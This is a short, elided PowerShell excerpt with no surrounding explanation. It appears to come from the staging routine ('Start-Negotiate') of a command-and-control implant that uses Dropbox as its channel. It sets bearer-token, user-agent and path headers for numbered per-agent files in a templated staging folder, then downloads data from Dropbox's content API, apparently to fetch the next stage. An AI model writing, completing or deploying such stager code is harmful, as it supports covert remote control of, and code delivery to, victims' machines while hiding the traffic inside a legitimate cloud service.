...
function Start-Negotiate {
    ...
    $wc.Headers.Set("Dropbox-API-Arg", "{`"path`":`"{{ staging_folder }}/$($ID)_1.txt`"}");
    ...
    $wc.Headers.Set("User-Agent",$UA);
    $wc.Headers.Set("Authorization", "Bearer $T");
    $wc.Headers.Set("Dropbox-API-Arg", "{`"path`":`"{{ staging_folder }}/$($ID)_2.txt`"}");
    ...
    $wc.Headers.Set("Authorization", "Bearer $T");
    $wc.Headers.Set("Content-Type", "application/octet-stream");
    $wc.Headers.Set("Dropbox-API-Arg", "{`"path`":`"{{ staging_folder }}/$($ID)_3.txt`"}");
    ...
    $wc.Headers.Set("User-Agent",$UA);
    $wc.Headers.Set("Authorization", "Bearer $T");
    $wc.Headers.Set("Dropbox-API-Arg", "{`"path`":`"{{ staging_folder }}/$($ID)_4.txt`"}");
    $raw=$wc.DownloadData("https://content.dropboxapi.com/2/files/download");
